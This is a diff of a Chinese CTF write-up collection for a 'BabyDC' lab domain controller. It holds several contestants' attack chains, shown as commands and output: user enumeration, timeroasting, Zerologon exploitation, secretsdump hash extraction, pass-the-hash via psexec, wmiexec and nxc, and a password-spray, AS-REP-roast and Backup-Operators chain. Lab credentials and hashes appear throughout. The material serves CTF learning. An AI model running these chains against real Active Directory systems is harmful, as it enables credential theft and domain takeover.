-| <font style="color:#333333;">Administrator</font> | <font style="color:#333333;">d94f9831271e229dbc6e712097b63168</font> |
-| <font style="color:#333333;">Alucard</font> | <font style="color:#333333;">d94f9831271e229dbc6e712097b63168</font> |
-| <font style="color:#333333;">krbtgt</font> | <font style="color:#333333;">1e3c4fe72e1383c576b4b3aeef4730a8</font> |
-| <font style="color:#333333;">sqlsvc     </font> | <font style="color:#333333;">d93ef04edb808c5bce3a5bd67b936ca9</font> |
+| Administrator | d94f9831271e229dbc6e712097b63168 |
+| Alucard | d94f9831271e229dbc6e712097b63168 |
+| krbtgt | 1e3c4fe72e1383c576b4b3aeef4730a8 |
+| sqlsvc      | d93ef04edb808c5bce3a5bd67b936ca9 |
 
 
 ## hash login
 ### psexec
-<font style="color:#333333;">使用Administrator 的哈希登录-system</font>
+使用Administrator 的哈希登录-system
 
 ![](/image/myself%20machine/Castlevania-Unexpected-17.jpeg)
 
 ### wmiexec
-<font style="color:#333333;">wmiexec连接才是administrator</font>
+wmiexec连接才是administrator
 
 ![](/image/myself%20machine/Castlevania-Unexpected-18.jpeg)
 
-# <font style="color:rgb(208, 155, 73);background-color:rgba(233, 242, 249, 0.5);">相逢何必曾相识</font><font style="color:#333333;">（</font><font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font><font style="color:rgb(0, 0, 0);">）</font><font style="color:#333333;">     </font>
-## <font style="color:black;">kerbrute</font>
+# 相逢何必曾相识（Zerologon）     
+## kerbrute
 ```plain
 $ kerbrute userenum --dc $ip -d XMCVE.local /home/hank/tools/dic/us
 __             __               __        / /_____  _____/ /_  _______  __/ /____   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \  / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
@@ -880,7 +881,7 @@ Version: v1.0.3 (9dad6e1) - 03/28/26 - Ronnie Flathers @rop nop
 2026/03/28 09:52:14 >  [+] VALID USERNAME: Administrator@XMCVE.loca
 ```
 
-## <font style="color:black;">端口扫描</font>
+## 端口扫描
 ```plain
 $ fscan -h 10.200.26.154
 ┌──────────────────────────────────────────────┐
@@ -911,14 +912,14 @@ Fscan Version: 2.0.0
 [2026-03-28 09:46:04] [SUCCESS] 服务识别 10.200.26.154:445 =
 ```
 
-## <font style="color:black;">timeroast-</font>_<font style="color:black;">时钟烘焙</font>_
+## timeroast-_时钟烘焙_
 ```plain
 └─$ python timeroast.py $ip 
 1001:$sntp-ms$cc55305a19f98b32c9531c0c6ee10342$1c0111e90000 0000000a02c44c4f434ced7257d9052ad312e1b8428bffbfcd0aed725b7 ebd3b0666ed725b7ebd3b47d4
 ```
 
-## <font style="color:black;">zerologon</font>
-> <font style="color:black;">简单看了下没有匿名端⼝，时钟烘焙破解不出，web没信息，开始查看历史漏洞，发现存在CVE2020 1472，我感觉是⾮预期解。要不然真的有点太简单了，不过确实拿下了</font>
+## zerologon
+> 简单看了下没有匿名端⼝，时钟烘焙破解不出，web没信息，开始查看历史漏洞，发现存在CVE2020 1472，我感觉是⾮预期解。要不然真的有点太简单了，不过确实拿下了
 >
 
 ```plain
@@ -931,7 +932,7 @@ ZEROLOGON   10.200.26.154   445    CASTLEVANIA      VULNERA
 BLE ZEROLOGON   10.200.26.154   445    CASTLEVANIA      Next st ep: https://github.com/dirkjanm/CVE-2020-1472 直接dumphash
 ```
 
-## <font style="color:black;">secretsdump</font>
+## secretsdump
 ```plain
 └─$ impacket-secretsdump -no-pass -just-dc CASTLEVANIA\$@$i p
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -975,14 +976,14 @@ XMCVE.local\admin:des-cbc-md5:49d9c74562bca1ce XMCVE.local\sqlsvc:aes256-cts-hma
 XMCVE.local\sqlsvc:des-cbc-md5:e9a292087902f10d CASTLEVANIA$:aes256-cts-hmac-sha1-96:fc320757aa82369c8e3e68 a68b43f1afc78f1c8f4c86a08a9c11cd822cbce051 CASTLEVANIA$:aes128-cts-hmac-sha1-96:bdfe62da40fc7daf73f4ab d6549e431a CASTLEVANIA$:des-cbc-md5:375162a731320467
 ```
 
-## <font style="color:black;">nxc</font>
+## nxc
 ```plain
 └─$ nxc smb $ip -u Administrator -H d94f9831271e229dbc6e712097b63168 
 SMB         10.200.26.154   445    CASTLEVANIA      [*] Win dows 10 / Server 2019 Build 17763 x64 (name:CASTLEVANIA) (domin:XMCVE.local) (signing:True) (SMBv1:False) 
 SMB         10.200.26.154   445    CASTLEVANIA      [+] XMC VE.local\Administrator:d94f9831271e229dbc6e712097b63168 (Pwn3d!)
 ```
 
-## <font style="color:black;">psexec</font>
+## psexec
 ```plain
 └─$ impacket-psexec "XMCVE.local/administrator@$ip" -hashes :d94f9831271e229dbc6e712097b63168 -no-pass
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -996,26 +997,26 @@ Microsoft Windows [Version 10.0.17763.107] (c) 2018 Microsoft Corporation???????
 C:\Windows\system32> so fucking ez'so' is not recognized as an internal or external command, operable program or batch file.
 ```
 
-# ai幻神之力<font style="color:#333333;">（本地挂载</font><font style="color:rgb(0, 0, 0);">）</font><font style="color:#333333;">     </font>
-## <font style="color:rgb(51, 51, 51);">详细复现过程</font>
-### <font style="color:rgb(51, 51, 51);">1. 本地搭建</font>
-<font style="color:rgb(51, 51, 51);">题目附件是整机镜像 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Bloodstained.ova</font>`<font style="color:rgb(51, 51, 51);">。本地没有直接可用的官方 VirtualBox 7.2.0 图形界面环境，所以我直接用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">VBoxManage.exe</font>`<font style="color:rgb(51, 51, 51);"> 做手工导入和挂盘。</font>
+# ai幻神之力（本地挂载）     
+## 详细复现过程
+### 1. 本地搭建
+题目附件是整机镜像 `Bloodstained.ova`。本地没有直接可用的官方 VirtualBox 7.2.0 图形界面环境，所以我直接用 `VBoxManage.exe` 做手工导入和挂盘。
 
-<font style="color:rgb(51, 51, 51);">实际跑通时使用到的关键环境如下：</font>
+实际跑通时使用到的关键环境如下：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">C:\Program Files\ldplayer9box\VBoxManage.exe</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">D:\Python\Python311\python.exe</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">D:\Python\Python311\Scripts\secretsdump.py</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wsl.exe -d kali-linux</font>`
++ `C:\Program Files\ldplayer9box\VBoxManage.exe`
++ `D:\Python\Python311\python.exe`
++ `D:\Python\Python311\Scripts\secretsdump.py`
++ `wsl.exe -d kali-linux`
 
-<font style="color:rgb(51, 51, 51);">处理方式不是直接 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">VBoxManage import</font>`<font style="color:rgb(51, 51, 51);">，而是：</font>
+处理方式不是直接 `VBoxManage import`，而是：
 
-1. <font style="color:rgb(51, 51, 51);">从 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Bloodstained.ova</font>`<font style="color:rgb(51, 51, 51);"> 解出 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Bloodstained.ovf</font>`<font style="color:rgb(51, 51, 51);"> 和 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Bloodstained 1-disk001.vmdk</font>`
-2. <font style="color:rgb(51, 51, 51);">把 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">streamOptimized</font>`<font style="color:rgb(51, 51, 51);"> 的 VMDK 转成可直接挂载的 VDI</font>
-3. <font style="color:rgb(51, 51, 51);">手工创建 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Windows2019_64</font>`<font style="color:rgb(51, 51, 51);"> 虚拟机并挂盘</font>
-4. <font style="color:rgb(51, 51, 51);">配置 NAT 端口转发</font>
+1. 从 `Bloodstained.ova` 解出 `Bloodstained.ovf` 和 `Bloodstained 1-disk001.vmdk`
+2. 把 `streamOptimized` 的 VMDK 转成可直接挂载的 VDI
+3. 手工创建 `Windows2019_64` 虚拟机并挂盘
+4. 配置 NAT 端口转发
 
-<font style="color:rgb(51, 51, 51);">端口转发实际使用的是：</font>
+端口转发实际使用的是：
 
 ```plain
 127.0.0.1:18080 -> 80
@@ -1024,27 +1025,27 @@ C:\Windows\system32> so fucking ez'so' is not recognized as an internal or exter
 127.0.0.1:10445 -> 445
 ```
 
-<font style="color:rgb(51, 51, 51);">虚拟机启动后，确认到：</font>
+虚拟机启动后，确认到：
 
-+ <font style="color:rgb(51, 51, 51);">主机名：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">CASTLEVANIA</font>`
-+ <font style="color:rgb(51, 51, 51);">域名：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE.local</font>`
++ 主机名：`CASTLEVANIA`
++ 域名：`XMCVE.local`
 
-### <font style="color:rgb(51, 51, 51);">2. 在线确认与离线取证</font>
-<font style="color:rgb(51, 51, 51);">先做最小在线确认：</font>
+### 2. 在线确认与离线取证
+先做最小在线确认：
 
-+ <font style="color:rgb(51, 51, 51);">Web 首页在 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">http://127.0.0.1:18080/</font>`
-+ <font style="color:rgb(51, 51, 51);">LDAP RootDSE 匿名可读</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">defaultNamingContext: DC=XMCVE,DC=local</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">dnsHostName: CASTLEVANIA.XMCVE.local</font>`
++ Web 首页在 `http://127.0.0.1:18080/`
++ LDAP RootDSE 匿名可读
++ `defaultNamingContext: DC=XMCVE,DC=local`
++ `dnsHostName: CASTLEVANIA.XMCVE.local`
 
-<font style="color:rgb(51, 51, 51);">随后改走离线链路，从 VMDK 里直接导出关键文件：</font>
+随后改走离线链路，从 VMDK 里直接导出关键文件：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/Windows/NTDS/ntds.dit</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/Windows/System32/config/SYSTEM</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/Windows/System32/config/SECURITY</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">/inetpub/wwwroot</font>`
++ `/Windows/NTDS/ntds.dit`
++ `/Windows/System32/config/SYSTEM`
++ `/Windows/System32/config/SECURITY`
++ `/inetpub/wwwroot`
 
-<font style="color:rgb(51, 51, 51);">站点目录里还可以看到一个明文连接文件 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">poo_connection.txt</font>`<font style="color:rgb(51, 51, 51);">：</font>
+站点目录里还可以看到一个明文连接文件 `poo_connection.txt`：
 
 ```plain
 server=localhost;
@@ -1053,10 +1054,10 @@ password=lovlyBaby
 database=master
 ```
 
-<font style="color:rgb(51, 51, 51);">这说明题目环境里确实存在 IIS + MSSQL，但这组数据库凭据本身不是最后拿管理员 shell 的关键。</font>
+这说明题目环境里确实存在 IIS + MSSQL，但这组数据库凭据本身不是最后拿管理员 shell 的关键。
 
-### <font style="color:rgb(51, 51, 51);">3. 离线导出域控凭据</font>
-<font style="color:rgb(51, 51, 51);">对离线导出的三件套执行：</font>
+### 3. 离线导出域控凭据
+对离线导出的三件套执行：
 
 ```plain
 python secretsdump.py -system offline/hives/SYSTEM \
@@ -1064,16 +1065,16 @@ python secretsdump.py -system offline/hives/SYSTEM \
   -ntds offline/hives/ntds.dit LOCAL
 ```
 
-<font style="color:rgb(51, 51, 51);">得到两个关键结果：</font>
+得到两个关键结果：
 
-<font style="color:rgb(51, 51, 51);">一是 LSA Secret 里有 MSSQL 服务口令：</font>
+一是 LSA Secret 里有 MSSQL 服务口令：
 
 ```plain
 _SC_MSSQLSERVER
 (Unknown User):Sql!2026
 ```
 
-<font style="color:rgb(51, 51, 51);">二是直接解出了域控账号哈希，其中最关键的是：</font>
+二是直接解出了域控账号哈希，其中最关键的是：
 
 ```plain
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::
@@ -1081,57 +1082,57 @@ Alucard:1000:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168::
 XMCVE.local\sqlsvc:1112:aad3b435b51404eeaad3b435b51404ee:d93ef04edb808c5bce3a5bd67b936ca9:::
 ```
 
-<font style="color:rgb(51, 51, 51);">这里 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 的 NTLM 为：</font>
+这里 `Administrator` 的 NTLM 为：
 
 d94f9831271e229dbc6e712097b63168
 
-### <font style="color:rgb(51, 51, 51);">4. 拿管理员 shell</font>
-<font style="color:rgb(51, 51, 51);">最终没有再依赖单独的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">psexec_anyport.py</font>`<font style="color:rgb(51, 51, 51);">。现在的做法是把远程执行逻辑直接写进一个单文件脚本里：</font>
+### 4. 拿管理员 shell
+最终没有再依赖单独的 `psexec_anyport.py`。现在的做法是把远程执行逻辑直接写进一个单文件脚本里：
 
-1. <font style="color:rgb(51, 51, 51);">从 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">artifacts_secretsdump.txt</font>`<font style="color:rgb(51, 51, 51);"> 自动提取 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 哈希</font>
-2. <font style="color:rgb(51, 51, 51);">连接 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">127.0.0.1:10445</font>`
-3. <font style="color:rgb(51, 51, 51);">通过 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">svcctl</font>`<font style="color:rgb(51, 51, 51);"> 创建临时服务</font>
-4. <font style="color:rgb(51, 51, 51);">用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">cmd.exe</font>`<font style="color:rgb(51, 51, 51);"> 落一个临时 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">.bat</font>`
-5. <font style="color:rgb(51, 51, 51);">执行 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">whoami</font>`<font style="color:rgb(51, 51, 51);"> 和 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">hostname</font>`
-6. <font style="color:rgb(51, 51, 51);">从 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">ADMIN$\\Temp\\</font>`<font style="color:rgb(51, 51, 51);"> 把输出回读回来</font>
+1. 从 `artifacts_secretsdump.txt` 自动提取 `Administrator` 哈希
+2. 连接 `127.0.0.1:10445`
+3. 通过 `svcctl` 创建临时服务
+4. 用 `cmd.exe` 落一个临时 `.bat`
+5. 执行 `whoami` 和 `hostname`
+6. 从 `ADMIN$\\Temp\\` 把输出回读回来
 
-<font style="color:rgb(51, 51, 51);">实测输出为：</font>
+实测输出为：
 
 ```plain
 whoami    -> nt authority\system
 hostname  -> CASTLEVANIA
 ```
 
-<font style="color:rgb(51, 51, 51);">这说明已经在目标域控上拿到了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">NT AUTHORITY\SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 级别的命令执行，满足“拿到 Administrator shell”的要求。</font>
+这说明已经在目标域控上拿到了 `NT AUTHORITY\SYSTEM` 级别的命令执行，满足“拿到 Administrator shell”的要求。
 
-### <font style="color:rgb(51, 51, 51);">5. 一键脚本说明</font>
-<font style="color:rgb(51, 51, 51);">现在只保留一份主脚本：</font>
+### 5. 一键脚本说明
+现在只保留一份主脚本：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">babydc_unified.py</font>`
++ `babydc_unified.py`
 
-<font style="color:rgb(51, 51, 51);">它包含两个入口：</font>
+它包含两个入口：
 
 ```plain
 python .\babydc_unified.py full
 python .\babydc_unified.py verify
 ```
 
-<font style="color:rgb(51, 51, 51);">含义分别是：</font>
+含义分别是：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">full</font>`<font style="color:rgb(51, 51, 51);">：从当前目录里的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Bloodstained.ova</font>`<font style="color:rgb(51, 51, 51);"> 出发，完成虚拟机准备、离线导出、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">secretsdump</font>`<font style="color:rgb(51, 51, 51);">、管理员权限验证</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">verify</font>`<font style="color:rgb(51, 51, 51);">：如果 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">artifacts_secretsdump.txt</font>`<font style="color:rgb(51, 51, 51);"> 已经存在，只做管理员 shell 校验</font>
++ `full`：从当前目录里的 `Bloodstained.ova` 出发，完成虚拟机准备、离线导出、`secretsdump`、管理员权限验证
++ `verify`：如果 `artifacts_secretsdump.txt` 已经存在，只做管理员 shell 校验
 
-<font style="color:rgb(51, 51, 51);">我实际跑通的命令是：</font>
+我实际跑通的命令是：
 
 ```plain
 D:\Python\Python311\python.exe .\babydc_unified.py --python D:\Python\Python311\python.exe verify
 D:\Python\Python311\python.exe .\babydc_unified.py --python D:\Python\Python311\python.exe full
 ```
 
-<font style="color:rgb(51, 51, 51);">其中 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">full</font>`<font style="color:rgb(51, 51, 51);"> 模式在虚拟机刚启动时，域控服务有一个短暂的未就绪窗口，所以脚本里加入了自动重试。实测会在若干次 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">STATUS_LOGON_FAILURE</font>`<font style="color:rgb(51, 51, 51);"> 之后继续跑通，这属于正常现象。</font>
+其中 `full` 模式在虚拟机刚启动时，域控服务有一个短暂的未就绪窗口，所以脚本里加入了自动重试。实测会在若干次 `STATUS_LOGON_FAILURE` 之后继续跑通，这属于正常现象。
 
-## <font style="color:rgb(51, 51, 51);">一键可复现代码</font>
-<font style="color:rgb(51, 51, 51);">当前最终版脚本全文如下，直接保存为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">babydc_unified.py</font>`<font style="color:rgb(51, 51, 51);"> 即可使用：</font>
+## 一键可复现代码
+当前最终版脚本全文如下，直接保存为 `babydc_unified.py` 即可使用：
 
 ```plain
 import argparse
@@ -1800,30 +1801,30 @@ XMCVE.local\sqlsvc:des-cbc-md5:e9a292087902f10d
 [*] Cleaning up... 
 ```
 
-## <font style="color:rgb(51, 51, 51);">最终答案</font>
-<font style="color:rgb(51, 51, 51);">最终权限证明如下：</font>
+## 最终答案
+最终权限证明如下：
 
 ```plain
 whoami    -> nt authority\system
 hostname  -> CASTLEVANIA
 ```
 
-<font style="color:rgb(51, 51, 51);">对应证据文件为：</font>
+对应证据文件为：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">artifacts_secretsdump.txt</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">artifacts_system_whoami.txt</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">artifacts_system_hostname.txt</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">proof_system.png</font>`
++ `artifacts_secretsdump.txt`
++ `artifacts_system_whoami.txt`
++ `artifacts_system_hostname.txt`
++ `proof_system.png`
 
-<font style="color:rgb(51, 51, 51);">如果只需要快速验证管理员 shell，不需要重新走完整链路，直接执行：</font>
+如果只需要快速验证管理员 shell，不需要重新走完整链路，直接执行：
 
 D:\Python\Python311\python.exe .\babydc_unified.py --python D:\Python\Python311\python.exe verify
 
-<font style="color:rgb(51, 51, 51);">如果需要从当前附件目录重新完整复现，直接执行：</font>
+如果需要从当前附件目录重新完整复现，直接执行：
 
 D:\Python\Python311\python.exe .\babydc_unified.py --python D:\Python\Python311\python.exe full
 
-# 平台漏洞<font style="color:#333333;">（？？？</font><font style="color:rgb(0, 0, 0);">）</font><font style="color:#333333;">     </font>
+# 平台漏洞（？？？）     
 ## 漏洞描述
 ![](/image/myself%20machine/Castlevania-Unexpected-19.jpeg)
 
@@ -1893,7 +1894,7 @@ const Sa = s => E.post(Oe.getNoticeInfo, s)
 
 ![](/image/myself%20machine/Castlevania-Unexpected-22.png)
 
-# scdyh<font style="color:#333333;">（</font><font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font><font style="color:rgb(0, 0, 0);">）</font><font style="color:#333333;">     </font>
+# scdyh（Zerologon）     
 ## 端口扫描
 ```plain
 | MIIDADCCAeigAwIBAgIQfKZK7ctznLZKnQZokrA1IzANBgkqhkiG9w0BAQUFADA7
@@ -2010,7 +2011,7 @@ pth 上线
 
 
 
-# <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">''Always⌒</font><font style="color:#333333;">（</font><font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font><font style="color:rgb(0, 0, 0);">）</font><font style="color:#333333;">   </font>
+# ''Always⌒（Zerologon）   
 ## 题目信息
 名称: BabyDC
 
@@ -2214,7 +2215,7 @@ Global Group memberships    *Domain Users         *Domain Admins
 [4] 获取 CASTLEVANIA (DC) 的 SYSTEM / Domain Admin Shell
 ```
 
-# <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">Pr0x1ma</font><font style="color:#333333;">（</font><font style="color:rgb(20, 29, 34);background-color:rgb(245, 250, 255);">Zerologon</font><font style="color:rgb(0, 0, 0);">）</font><font style="color:#333333;">   </font>
+# Pr0x1ma（Zerologon）   
 ## 配环境  
 ![](/image/myself%20machine/Castlevania-Unexpected-23.png)
 
@@ -2313,49 +2314,49 @@ curl -I 192.168.56.101
 
 ![](/image/myself%20machine/Castlevania-Unexpected-37.png)
 
-# <font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">公主姐姐</font>**<font style="color:rgb(4, 30, 42);background-color:rgba(233, 242, 249, 0.5);">（域用户-弱口令）</font>**
-## <font style="color:rgb(51, 51, 51);">题目信息</font>
-<font style="color:rgb(51, 51, 51);">题目名称：BabyDC</font>
+# 公主姐姐**（域用户-弱口令）**
+## 题目信息
+题目名称：BabyDC
 
-<font style="color:rgb(51, 51, 51);">目标地址：</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">192.168.56.155</font>`
+目标地址：`192.168.56.155`
 
-<font style="color:rgb(51, 51, 51);">本题没有提供最终 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">flag.txt</font>`<font style="color:rgb(51, 51, 51);">，通关目标是获取最高权限。实际打通后，不仅拿到了目标主机的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">NT AUTHORITY\SYSTEM</font>`<font style="color:rgb(51, 51, 51);">，还进一步导出了整套域凭据，因此可以认为整台域控已经被完全接管。</font>
+本题没有提供最终 `flag.txt`，通关目标是获取最高权限。实际打通后，不仅拿到了目标主机的 `NT AUTHORITY\SYSTEM`，还进一步导出了整套域凭据，因此可以认为整台域控已经被完全接管。
 
-## <font style="color:rgb(51, 51, 51);">整体判断</font>
-<font style="color:rgb(51, 51, 51);">这题最关键的地方不在 Web 页面本身，而在于它是一台对外暴露了多种企业服务的域控。最开始做端口识别时，可以看到同时开放了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">80</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">88</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">389</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">445</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">1433</font>`<font style="color:rgb(51, 51, 51);"> 等典型的 AD 与 MSSQL 服务端口。看到这种端口组合，应该立刻意识到这不是单纯的 Web 打点题，而是一个典型的“从弱口令或目录服务入手，逐步拿域内高权限”的内网题。</font>
+## 整体判断
+这题最关键的地方不在 Web 页面本身，而在于它是一台对外暴露了多种企业服务的域控。最开始做端口识别时，可以看到同时开放了 `80`、`88`、`389`、`445`、`1433` 等典型的 AD 与 MSSQL 服务端口。看到这种端口组合，应该立刻意识到这不是单纯的 Web 打点题，而是一个典型的“从弱口令或目录服务入手，逐步拿域内高权限”的内网题。
 
-<font style="color:rgb(51, 51, 51);">真正打通这题的主链如下：</font>
+真正打通这题的主链如下：
 
-1. <font style="color:rgb(51, 51, 51);">先识别主机角色，确认这是一台域控。</font>
-2. <font style="color:rgb(51, 51, 51);">用 Kerberos 与 SMB 做小规模弱口令喷洒，拿到首个低权域账户。</font>
-3. <font style="color:rgb(51, 51, 51);">用这个低权账户查询 LDAP，找到开启“不需要 Kerberos 预认证”的用户。</font>
-4. <font style="color:rgb(51, 51, 51);">对该用户做 AS-REP Roast，离线爆破得到更高价值账户口令。</font>
-5. <font style="color:rgb(51, 51, 51);">利用该账户属于 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);"> 这一点，远程备份注册表 hive。</font>
-6. <font style="color:rgb(51, 51, 51);">将 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SAM</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SECURITY</font>`<font style="color:rgb(51, 51, 51);"> 拉回本地离线提取秘密，拿到本地 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 哈希和服务账号口令。</font>
-7. <font style="color:rgb(51, 51, 51);">使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 的 NTLM 直接 Pass-the-Hash 到目标，获得 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);">。</font>
-8. <font style="color:rgb(51, 51, 51);">再用已经拿到的高权限继续导出整套域凭据，完成整题。</font>
+1. 先识别主机角色，确认这是一台域控。
+2. 用 Kerberos 与 SMB 做小规模弱口令喷洒，拿到首个低权域账户。
+3. 用这个低权账户查询 LDAP，找到开启“不需要 Kerberos 预认证”的用户。
+4. 对该用户做 AS-REP Roast，离线爆破得到更高价值账户口令。
+5. 利用该账户属于 `Backup Operators` 这一点，远程备份注册表 hive。
+6. 将 `SAM`、`SYSTEM`、`SECURITY` 拉回本地离线提取秘密，拿到本地 `Administrator` 哈希和服务账号口令。
+7. 使用 `Administrator` 的 NTLM 直接 Pass-the-Hash 到目标，获得 `SYSTEM`。
+8. 再用已经拿到的高权限继续导出整套域凭据，完成整题。
 
-<font style="color:rgb(51, 51, 51);">整个过程里，真正起决定作用的知识点只有三个：</font>
+整个过程里，真正起决定作用的知识点只有三个：
 
-+ <font style="color:rgb(51, 51, 51);">域用户弱口令喷洒</font>
-+ <font style="color:rgb(51, 51, 51);">AS-REP Roast</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);"> 结合 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">reg.py backup</font>`<font style="color:rgb(51, 51, 51);"> 远程导出 hive</font>
++ 域用户弱口令喷洒
++ AS-REP Roast
++ `Backup Operators` 结合 `reg.py backup` 远程导出 hive
 
-<font style="color:rgb(51, 51, 51);">其它分支虽然有探测，但并没有用于最终利用链，这里不写。</font>
+其它分支虽然有探测，但并没有用于最终利用链，这里不写。
 
-## <font style="color:rgb(51, 51, 51);">第一步：端口识别，确认目标是一台域控</font>
-<font style="color:rgb(51, 51, 51);">先用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">nmap</font>`<font style="color:rgb(51, 51, 51);"> 对目标做标准服务识别：</font>
+## 第一步：端口识别，确认目标是一台域控
+先用 `nmap` 对目标做标准服务识别：
 
-<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">nmap -Pn -sC -sV -T4 192.168.56.155</font>
+nmap -Pn -sC -sV -T4 192.168.56.155
 
-<font style="color:rgb(51, 51, 51);">这条命令的作用如下：</font>
+这条命令的作用如下：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">-Pn</font>`<font style="color:rgb(51, 51, 51);"> 表示不做主机发现，直接认为目标在线，避免 ICMP 被过滤导致误判。</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">-sC</font>`<font style="color:rgb(51, 51, 51);"> 调用常用 NSE 脚本，补充基础服务信息。</font>
